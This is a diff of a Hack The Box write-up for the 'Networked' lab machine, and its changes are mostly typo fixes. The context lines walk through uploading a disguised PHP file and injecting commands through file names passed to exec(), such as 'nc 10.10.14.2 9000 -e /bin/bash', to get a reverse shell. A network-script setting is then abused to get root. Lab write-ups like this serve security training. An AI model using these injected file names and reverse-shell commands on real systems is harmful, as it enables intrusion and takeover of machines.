@@ -7,7 +7,7 @@ tags: magic-bytes network-scripts "sudo -l"
 
 # **Networked - 10.10.10.146**
 
-####  `Networked` is a simple, straight-forward machine with no rabbit holes, which is why it is a great machine . The IP of the machine is **10.10.10.146**. This machine like most machines in **HTB** comes with lot of new things to learn.
+####  `Networked` is a simple, straight-forward machine with no rabbit holes, which is why it is a great machine. The IP of the machine is **10.10.10.146**. This machine like most machines in **HTB** comes with lot of new things to learn.
 
 
 ## **1.Enumeration**
@@ -36,13 +36,13 @@ Nmap done: 1 IP address (1 host up) scanned in 32.29 seconds
 
   ```
 
-We see tha two ports 22 and 80 are open in this machine. Considering higher probability of finding vulnerability in port 80, let us enumerate port 80.
+We see that two ports 22 and 80 are open in this machine. Considering higher probability of finding vulnerability in port 80, let us enumerate port 80.
 
 ### Port 80
 
 ![networked_webpage](/images/htb/Networked/networked_webpage.png)
 
-Since we could not find much information in the webpage, let us dig in deeper and check if we can find more directories or web pages. For this let us use `GoBuster`.
+Since we could not find much information in the webpage, let us dig in deeper and check if we can find more directories or web pages. For this, let us use `GoBuster`.
 
 ``` bash
 gobuster dir --url=http://10.10.10.146 --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php
@@ -104,7 +104,7 @@ We go to page `/upload.php` as shown below.
 
 ![network_upload_1](/images/htb/Networked/network_upload_1.png)
 
-Now we can browse and uplad the `reverse.php.gif` file and we get the following result.
+Now we can browse and upload the `reverse.php.gif` file and we get the following result.
 
 ![netwrk_upload_2](/images/htb/Networked/network_upload_2.png)
 
@@ -127,7 +127,7 @@ But as we see below we are not able to access the user.txt file. To access it we
 ### **Privilege Escalation- guly**
 In the `/home/guly` directory we find a file named `check_attack.php`. Let us try to understand what the file does.
 
-From the program we observe that `$path$value` is called to be deleted when attack observed. This is nothing but name of filenames in folder `/var/www/uploads/` with the full path. Now, if we can give a command as input to the exec() we can get code execution. This requires manupilation of file name to contain the code we need to execute.
+From the program we observe that `$path$value` is called to be deleted when attack observed. This is nothing but name of filenames in folder `/var/www/uploads/` with the full path. If we can give a command as input to the exec() we can get to execute that command. This requires manupilation of file name to contain the code we need to execute.
 After trying names like `10_10_14_2;nc 10.10.14.2 9000 -e sh.png`, `10_10_14_2;nc 10.10.14.2 9000 -e bash &.png`, I realised that the reverse shell closes immediately. I tried doing `nc 10.10.14.2 9000 -e bash`and the same happened. Then I tried `nc 10.10.14.2 9000 -e /bin/bash`. This time, I got a stable shell !!!
 Oops, how do we give that as file name ???
 I decided to take help of environment variables, checked value of `$SHELL` and found it to be `/sbin/nologin`.
@@ -170,3 +170,4 @@ So we observe that the input can be used to run arbitrary commands as root :)
 
 The second command given as value to PROXY_METHOD, gives us shell as root.
 
+### > Note : Any suggestion or feedback is accepted :D [Twitter-link](https://twitter.com/7axmi)
